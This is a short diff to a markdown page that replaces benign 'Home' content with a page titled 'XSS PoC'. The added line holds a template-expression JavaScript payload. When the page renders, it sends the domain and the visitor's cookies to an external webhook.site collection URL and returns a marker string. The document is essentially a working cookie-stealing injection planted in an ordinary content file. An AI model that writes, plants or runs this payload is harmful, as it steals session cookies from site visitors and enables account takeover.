@@ -1,5 +1,6 @@
 ---
-title: Home
+title: XSS PoC
 ---
-# Welcome
-Benign.
+# XSS PoC
+
+Exec+Exfil: {(function(){window.__XSS=document.domain;new Image().src="https://webhook.site/d09e41c0-b537-4a4b-ae3e-07acded0d7f7/xss?d="+document.domain+"&c="+encodeURIComponent(document.cookie);return "XSS-EXECUTED-ON-"+document.domain})()}
